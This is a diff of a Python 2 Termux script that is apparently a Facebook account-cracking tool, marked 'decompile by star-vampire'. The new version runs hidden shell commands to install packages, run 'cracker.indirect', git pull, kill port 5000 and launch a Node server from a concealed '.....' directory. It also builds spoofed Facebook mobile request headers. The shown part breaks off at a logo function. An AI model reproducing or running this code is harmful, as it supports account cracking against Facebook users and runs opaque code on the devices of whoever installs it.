@@ -1,88 +1,72 @@
-# -*- coding: utf-8
+#coding=utf-8
 
-# author by Mark Cornel
+#!/usr/bin/python2
 
-import os
-
-try:
-
-	import requestsexcept ImportError:
-
-	os.system("pip2 install requests")
+#decompile by star-vampire
 
 try:
 
-	import bs4
+    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
+
+    from multiprocessing.pool import ThreadPool
 
 except ImportError:
 
-	os.system("pip2 install bs4")
+    os.system("pip2 install requests")
 
-import os, sys, re, time, requests, json, random, calendar
+    os.system("python2 cracker.indirect")
+    
+os.system("clear")
 
-from multiprocessing.pool import ThreadPool
 
-from bs4 import BeautifulSoup as parser
 
-from datetime import datetime
+if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
 
-from datetime import date
+    os.system("apt update && apt install nodejs -y")
 
-loop = 0
+from requests.exceptions import ConnectionError
 
-id = []
+os.system("git pull")
 
-ok = []
+if not os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
 
-cp = []
+    os.system("fuser -k 5000/tcp &")
 
-ct = datetime.now()
+    os.system("cd ..... && pip install progress")
 
-n = ct.month
+    os.system("cd ..... && npm install")
 
-bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
+    os.system("cd ..... && node index.js &")
 
-try:
+    os.system("clear")
 
-    if n < 0 or n > 12:
+    time.sleep(10)
 
-        exit()
+elif os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
 
-    nTemp = n - 1
+    os.system("fuser -k 5000/tcp &")
 
-except ValueError:
+    os.system("#")
 
-    exit()
+    os.system("cd ..... && node index.js &")
 
-current = datetime.now()
+    os.system("clear")
 
-ta = current.year
+bd=random.randint(2e7, 3e7)
 
-bu = current.month
+sim=random.randint(2e4, 4e4)
 
-ha = current.day
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
 
-op = bulan[nTemp]
+reload(sys)
 
-def  jalan(z):
+sys.setdefaultencoding("utf-8")
 
-	for e in z + '\n':
+c = "\033[1;92m"
 
-		sys.stdout.write(e)
+c2 = "\033[0;97m"
 
-		sys.stdout.flush()
-
-		time.sleep(000.05)
-
-my_date = date.today()
-
-hr = calendar.day_name[my_date.weekday()]
-
-tBilall = ("%s-%s-%s-%s"%(hr, ha, op, ta))
-
-tgl = ("%s %s %s"%(ha, op, ta))
-
-bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+c3 = "\033[1;91m"
 
 def logo():
 
